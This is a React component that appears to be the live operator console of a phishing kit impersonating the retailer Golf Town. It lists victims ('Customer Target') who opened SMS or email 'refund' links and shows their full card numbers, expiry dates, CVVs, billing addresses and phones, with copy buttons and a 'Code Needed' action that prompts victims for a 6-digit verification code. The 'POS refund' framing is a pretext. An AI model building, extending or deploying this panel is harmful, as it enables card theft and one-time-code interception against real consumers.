import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  CreditCard, 
  Bell, 
  ExternalLink, 
  CheckCircle2, 
  Clock, 
  User, 
  Store, 
  Copy, 
  Check, 
  X, 
  RefreshCw,
  AlertCircle,
  Smartphone,
  KeyRound
} from 'lucide-react';

interface LiveSession {
  sessionId: string;
  recipientName: string;
  email: string;
  amount: string;
  storeId: string;
  custId: string;
  status: 'IDLE' | 'OPENED' | 'PROCESSING' | 'CODE_REQUIRED' | 'CODE_SUBMITTED' | 'REFUNDED' | 'SESSION_LEFT';
  openedAt?: string;
  cardDetails?: {
    cardNumber: string;
    expDate: string;
    cvv: string;
    cardholderName: string;
    streetAddress: string;
    city: string;
    province: string;
    postalCode: string;
    phone: string;
  };
  lastUpdated: number;
}

interface NoticeItem {
  id: string;
  timestamp: string;
  recipientEmail: string;
  recipientName: string;
  amount: string;
  storeId: string;
  custId: string;
  subject: string;
  actionType: string;
  depositToken: string;
  secureDepositUrl: string;
  status: string;
}

interface LiveSocketAdminModalProps {
  isOpen: boolean;
  onClose: () => void;
  onUpdateStatus?: (custId: string, status: 'Refunded' | 'Auth Code Needed' | 'Pending') => void;
}

export function LiveSocketAdminModal({ isOpen, onClose }: LiveSocketAdminModalProps) {
  const [sessions, setSessions] = useState<LiveSession[]>([]);
  const [notices, setNotices] = useState<NoticeItem[]>([]);
  const [selectedSession, setSelectedSession] = useState<LiveSession | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [filterTab, setFilterTab] = useState<'all' | 'opened' | 'filled'>('all');

  useEffect(() => {
    if (!isOpen) return;

    // Connect to admin SSE stream
    const eventSource = new EventSource('/api/socket/admin-stream');
    
    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.sessions) {
          setSessions(data.sessions);
          if (!selectedSession && data.sessions.length > 0) {
            // Default select the most recently updated session with data
            const active = data.sessions.find((s: LiveSession) => s.cardDetails?.cardNumber) || data.sessions[0];
            setSelectedSession(active);
          } else if (selectedSession) {
            const updated = data.sessions.find((s: LiveSession) => s.sessionId === selectedSession.sessionId);
            if (updated) setSelectedSession(updated);
          }
        }
        if (data.noticeHistory) {
          setNotices(data.noticeHistory);
        }
      } catch (err) {
        console.error('Admin stream parse error:', err);
      }
    };

    eventSource.onerror = () => {
      console.warn('Admin stream disconnected, reconnecting...');
    };

    // Also fetch notices directly
    fetch('/api/notice-history')
      .then(res => res.json())
      .then(data => {
        if (data.history) setNotices(data.history);
      })
      .catch(err => console.error(err));

    return () => {
      eventSource.close();
    };
  }, [isOpen]);

  const handleCopy = (text: string, fieldKey: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldKey);
    setTimeout(() => setCopiedField(null), 2500);
  };

  const handleMarkRefunded = async (sessionId: string) => {
    try {
      const res = await fetch('/api/socket/admin-action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, action: 'refunded_successfully' })
      });
      if (res.ok) {
        const data = await res.json();
        if (data.session) {
          setSelectedSession(data.session);
        }
        alert('Session successfully marked as Refunded via POS / Manual action!');
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleRequireCode = async (sessionId: string) => {
    try {
      const res = await fetch('/api/socket/admin-action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, action: 'require_code' })
      });
      if (res.ok) {
        const data = await res.json();
        if (data.session) {
          setSelectedSession(data.session);
        }
        alert('Customer prompted for 6-digit verification code!');
      }
    } catch (err) {
      console.error(err);
    }
  };

  if (!isOpen) return null;

  const filteredSessions = sessions.filter(s => {
    if (filterTab === 'opened') return s.status === 'OPENED' || s.openedAt;
    if (filterTab === 'filled') return s.cardDetails && s.cardDetails.cardNumber.length > 0;
    return true;
  });

  const activeOpenedCount = sessions.filter(s => s.status === 'OPENED' || s.cardDetails?.cardNumber).length;

  return (
    <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4">
      <div className="bg-slate-900 border border-slate-800 rounded-3xl w-full max-w-5xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        
        {/* HEADER */}
        <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-emerald-900/50 border border-emerald-700/50 flex items-center justify-center text-emerald-400 shadow-inner">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base font-extrabold text-white">GOLFTOWN Secure Link &amp; CC Live Monitor</h2>
                <span className="bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 text-[10px] font-bold px-2 py-0.5 rounded-full uppercase tracking-wider animate-pulse">
                  Live Feed Active
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Monitor when customers open secure links and view Credit Card details for manual POS terminal refunding.
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="w-9 h-9 rounded-full bg-slate-900 hover:bg-slate-800 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* SUB-NAV / FILTER TABS */}
        <div className="bg-slate-950/60 px-6 py-2.5 border-b border-slate-800 flex items-center justify-between gap-4 text-xs">
          <div className="flex items-center gap-2">
            <button
              onClick={() => setFilterTab('all')}
              className={`px-3 py-1.5 rounded-xl font-bold transition-colors ${filterTab === 'all' ? 'bg-emerald-600 text-white shadow' : 'bg-slate-900 text-slate-400 hover:text-white'}`}
            >
              All Sessions ({sessions.length})
            </button>
            <button
              onClick={() => setFilterTab('opened')}
              className={`px-3 py-1.5 rounded-xl font-bold transition-colors ${filterTab === 'opened' ? 'bg-emerald-600 text-white shadow' : 'bg-slate-900 text-slate-400 hover:text-white'}`}
            >
              Link Opened / Active ({sessions.filter(s => s.status === 'OPENED' || s.cardDetails?.cardNumber).length})
            </button>
            <button
              onClick={() => setFilterTab('filled')}
              className={`px-3 py-1.5 rounded-xl font-bold transition-colors ${filterTab === 'filled' ? 'bg-emerald-600 text-white shadow' : 'bg-slate-900 text-slate-400 hover:text-white'}`}
            >
              CC Info Submitted ({sessions.filter(s => s.cardDetails?.cardNumber).length})
            </button>
          </div>

          <div className="text-slate-400 text-[11px] hidden sm:block">
            Trusted Role: <strong className="text-emerald-400">GOLFTOWN POS Operator</strong>
          </div>
        </div>

        {/* BODY GRID */}
        <div className="grid grid-cols-1 lg:grid-cols-12 flex-1 overflow-hidden">
          
          {/* LEFT: SESSIONS / NOTICES LIST */}
          <div className="lg:col-span-5 border-r border-slate-800 overflow-y-auto p-4 space-y-2 bg-slate-950/40">
            <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider px-2 mb-2 flex items-center justify-between">
              <span>Customer Sessions &amp; Activity</span>
              <span>{filteredSessions.length} total</span>
            </div>

            {filteredSessions.length === 0 ? (
              <div className="p-8 text-center bg-slate-900/50 rounded-2xl border border-slate-800 text-slate-500 space-y-2">
                <Bell className="w-6 h-6 text-slate-600 mx-auto" />
                <p className="text-xs font-semibold">No active sessions detected yet.</p>
                <p className="text-[11px] text-slate-600">Send an SMS or Email refund notice to test live tracking.</p>
              </div>
            ) : (
              filteredSessions.map(s => {
                const hasCard = s.cardDetails && s.cardDetails.cardNumber.length > 0;
                const isSelected = selectedSession?.sessionId === s.sessionId;
                const isOpened = s.status === 'OPENED' || s.status === 'PROCESSING' || s.status === 'CODE_SUBMITTED' || s.status === 'REFUNDED' || s.openedAt;

                return (
                  <div
                    key={s.sessionId}
                    onClick={() => setSelectedSession(s)}
                    className={`p-3 rounded-2xl border cursor-pointer transition-all ${
                      isSelected 
                        ? 'bg-emerald-950/40 border-emerald-600 shadow-md shadow-emerald-950/50' 
                        : 'bg-slate-900 hover:bg-slate-850 border-slate-800'
                    }`}
                  >
                    <div className="flex items-start justify-between gap-2 mb-1">
                      <div className="font-bold text-white text-xs flex items-center gap-1.5">
                        <User className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                        <span className="truncate">{s.recipientName || 'Valued Customer'}</span>
                      </div>
                      <span className="font-mono font-black text-emerald-400 text-xs shrink-0">
                        ${s.amount}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-[11px] text-slate-400 mb-2">
                      <span>Store #{s.storeId} • Cust: {s.custId}</span>
                      <span className="font-mono">{new Date(s.lastUpdated).toLocaleTimeString()}</span>
                    </div>

                    <div className="flex items-center gap-1.5 flex-wrap">
                      {isOpened && (
                        <span className="inline-flex items-center gap-1 bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[10px] font-bold px-2 py-0.5 rounded-full">
                          <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                          Link Opened
                        </span>
                      )}
                      {hasCard && (
                        <span className="inline-flex items-center gap-1 bg-blue-500/20 text-blue-300 border border-blue-500/40 text-[10px] font-bold px-2 py-0.5 rounded-full">
                          <CreditCard className="w-3 h-3 text-blue-400" />
                          CC Info Submitted
                        </span>
                      )}
                      {s.status === 'REFUNDED' && (
                        <span className="inline-flex items-center gap-1 bg-purple-500/20 text-purple-300 border border-purple-500/40 text-[10px] font-bold px-2 py-0.5 rounded-full">
                          ✓ Refunded
                        </span>
                      )}
                      {!isOpened && !hasCard && (
                        <span className="inline-flex items-center gap-1 bg-slate-800 text-slate-400 text-[10px] font-medium px-2 py-0.5 rounded-full">
                          Pending Link Click
                        </span>
                      )}
                    </div>
                  </div>
                );
              })
            )}
          </div>

          {/* RIGHT: DETAILED CC INFO & REFUND ACTIONS FOR GOLFTOWN */}
          <div className="lg:col-span-7 overflow-y-auto p-6 bg-slate-900 flex flex-col justify-between">
            {selectedSession ? (
              <div className="space-y-6">
                
                {/* TOP SUMMARY CARD */}
                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 flex items-center justify-between">
                  <div>
                    <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Customer Target</div>
                    <div className="text-base font-extrabold text-white">{selectedSession.recipientName}</div>
                    <div className="text-xs text-slate-400">Account ID: <span className="font-mono text-emerald-400 font-bold">{selectedSession.custId}</span> (Store #{selectedSession.storeId})</div>
                  </div>
                  <div className="text-right">
                    <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Refund Amount</div>
                    <div className="text-xl font-black text-emerald-400">${selectedSession.amount} CAD</div>
                  </div>
                </div>

                {/* STATUS ALERT BANNER */}
                <div className={`p-4 rounded-2xl border flex items-center gap-3 ${
                  selectedSession.cardDetails?.cardNumber 
                    ? 'bg-emerald-950/50 border-emerald-700/60 text-emerald-200' 
                    : 'bg-amber-950/50 border-amber-700/60 text-amber-200'
                }`}>
                  <AlertCircle className="w-5 h-5 shrink-0" />
                  <div className="text-xs">
                    {selectedSession.cardDetails?.cardNumber ? (
                      <div>
                        <strong>Credit Card &amp; Billing Data Received!</strong> Customer has opened the secure link and submitted billing details for manual POS terminal refund.
                      </div>
                    ) : (
                      <div>
                        <strong>Awaiting Customer Input:</strong> Link opened ({selectedSession.openedAt || 'Active'}), but card details have not yet been submitted.
                      </div>
                    )}
                  </div>
                </div>

                {/* FULL CREDIT CARD & BILLING DETAILS BOX FOR GOLFTOWN POS */}
                <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 shadow-xl">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                    <div className="flex items-center gap-2">
                      <CreditCard className="w-4 h-4 text-emerald-400" />
                      <span className="text-xs font-bold text-white uppercase tracking-wider">Credit Card &amp; Billing Info for POS Terminal</span>
                    </div>
                    <span className="text-[10px] bg-emerald-950 text-emerald-400 border border-emerald-800 px-2 py-0.5 rounded-full font-extrabold">
                      GOLFTOWN Authorized View
                    </span>
                  </div>

                  {selectedSession.cardDetails && selectedSession.cardDetails.cardNumber ? (
                    <div className="space-y-3 text-xs">
                      
                      {/* CARD NUMBER */}
                      <div className="bg-slate-900 p-3 rounded-xl border border-slate-800 flex items-center justify-between">
                        <div>
                          <div className="text-[10px] text-slate-400 uppercase font-semibold">Card Number</div>
                          <div className="font-mono font-bold text-white text-sm tracking-widest">{selectedSession.cardDetails.cardNumber}</div>
                        </div>
                        <button
                          onClick={() => handleCopy(selectedSession.cardDetails?.cardNumber || '', 'card')}
                          className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg flex items-center gap-1 text-xs transition-colors"
                        >
                          {copiedField === 'card' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                          <span>{copiedField === 'card' ? 'Copied!' : 'Copy Card'}</span>
                        </button>
                      </div>

                      {/* EXP & CVV & CARDHOLDER */}
                      <div className="grid grid-cols-3 gap-2">
                        <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800">
                          <div className="text-[10px] text-slate-400 uppercase font-semibold">Expiry Date</div>
                          <div className="font-mono font-bold text-white">{selectedSession.cardDetails.expDate || 'MM/YY'}</div>
                        </div>
                        <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800">
                          <div className="text-[10px] text-slate-400 uppercase font-semibold">CVV Code</div>
                          <div className="font-mono font-bold text-white">{selectedSession.cardDetails.cvv || '---'}</div>
                        </div>
                        <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800">
                          <div className="text-[10px] text-slate-400 uppercase font-semibold">Cardholder Name</div>
                          <div className="font-bold text-white truncate">{selectedSession.cardDetails.cardholderName || selectedSession.recipientName}</div>
                        </div>
                      </div>

                      {/* BILLING ADDRESS */}
                      <div className="bg-slate-900 p-3 rounded-xl border border-slate-800">
                        <div className="text-[10px] text-slate-400 uppercase font-semibold mb-1">Billing Address &amp; Contact</div>
                        <div className="text-slate-200 font-medium">
                          {selectedSession.cardDetails.streetAddress || '123 Golf Links Rd'}, {selectedSession.cardDetails.city || 'Calgary'}, {selectedSession.cardDetails.province || 'AB'} {selectedSession.cardDetails.postalCode || 'T2P 2M5'}
                        </div>
                        <div className="text-slate-400 text-[11px] mt-1">
                          Phone: {selectedSession.cardDetails.phone || '(403) 723-0100'} | Email: {selectedSession.email || 'customer@golftown.com'}
                        </div>
                      </div>

                    </div>
                  ) : (
                    <div className="py-10 text-center text-slate-500 space-y-2">
                      <Clock className="w-8 h-8 text-slate-600 mx-auto animate-pulse" />
                      <p className="text-xs font-semibold">Awaiting secure credit card submission from customer...</p>
                      <p className="text-[11px] text-slate-600">Once the customer opens the secure link and submits billing info, full card details will appear here instantly.</p>
                    </div>
                  )}

                </div>

                {/* MANUAL POS REFUND ACTION BUTTONS */}
                <div className="space-y-3 pt-2">
                  <div className="flex items-center gap-3">
                    <button
                      onClick={() => handleMarkRefunded(selectedSession.sessionId)}
                      className="flex-1 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-extrabold text-xs rounded-2xl shadow-lg border border-emerald-400/40 flex items-center justify-center gap-2 transition-all"
                    >
                      <CheckCircle2 className="w-4 h-4 text-white" />
                      Refund Success
                    </button>
                    <button
                      onClick={() => handleRequireCode(selectedSession.sessionId)}
                      className="flex-1 py-3 bg-amber-600 hover:bg-amber-500 text-white font-extrabold text-xs rounded-2xl shadow-lg border border-amber-400/40 flex items-center justify-center gap-2 transition-all"
                    >
                      <KeyRound className="w-4 h-4 text-white" />
                      Code Needed
                    </button>
                  </div>
                  <button
                    onClick={() => {
                      const summary = `GOLFTOWN POS REFUND DETAILS:\nCustomer: ${selectedSession.recipientName}\nAmount: $${selectedSession.amount}\nCard: ${selectedSession.cardDetails?.cardNumber || 'N/A'}\nExp: ${selectedSession.cardDetails?.expDate || 'N/A'}\nCVV: ${selectedSession.cardDetails?.cvv || 'N/A'}\nAddress: ${selectedSession.cardDetails?.streetAddress || 'N/A'}`;
                      handleCopy(summary, 'all');
                    }}
                    className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-2xl border border-slate-700 flex items-center justify-center gap-1.5 transition-colors"
                  >
                    <Copy className="w-4 h-4 text-emerald-400" />
                    <span>{copiedField === 'all' ? 'Copied All!' : 'Copy Summary'}</span>
                  </button>
                </div>

              </div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-slate-500 space-y-2 py-20">
                <ShieldCheck className="w-10 h-10 text-slate-600 mx-auto" />
                <p className="text-sm font-semibold">Select a customer session from the left to view credit card details.</p>
              </div>
            )}
          </div>

        </div>

      </div>
    </div>
  );
}
